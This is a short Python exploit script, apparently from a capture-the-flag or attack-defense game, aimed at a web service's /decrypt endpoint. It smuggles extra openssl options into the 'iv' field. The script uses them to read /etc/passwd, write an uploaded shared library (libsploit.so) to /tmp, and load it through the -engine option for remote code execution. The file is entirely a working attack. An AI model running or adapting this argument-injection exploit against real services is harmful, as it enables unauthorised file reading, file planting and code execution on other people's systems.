#!/usr/bin/env python3.7

import sys
import json
import requests

from Crypto.Cipher import AES as AESCipher


IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = 7701

URL = f'http://{IP}:{PORT}/decrypt'

IV = 'A' * 32
KEY = 'A' * 32
MODE = 'CBC'


def AES():
    return AESCipher.new(bytes.fromhex(KEY), iv=bytes.fromhex(IV), mode=AESCipher.MODE_CBC)


def read_file(filename):
    response = requests.post(URL, json={
        'iv': f'{IV} -e -in {filename}',
        'key': KEY,
        'mode': MODE,
        'ciphertext': ''
    }).json()

    return AES().decrypt(bytes.fromhex(response['result']))


def write_file(data, filename):
    requests.post(URL, json={
        'iv': f'{IV} -nopad -out {filename}',
        'key': KEY,
        'mode': MODE,
        'ciphertext': AES().encrypt(data).hex()
    }).json()


def engine_rce(path):
    response = requests.post(URL, json={
        'iv': f'A -engine {path}',
        'key': KEY,
        'mode': MODE,
        'ciphertext': ''
    }).json()

    return response['result']


def main():
    print(read_file('/etc/passwd'))
    
    with open('libsploit.so', 'rb') as file:
        libsploit = file.read()

    path = '/tmp/libsploit.so'
    write_file(libsploit, path)

    print(engine_rce(path))


if __name__ == '__main__':
    main()
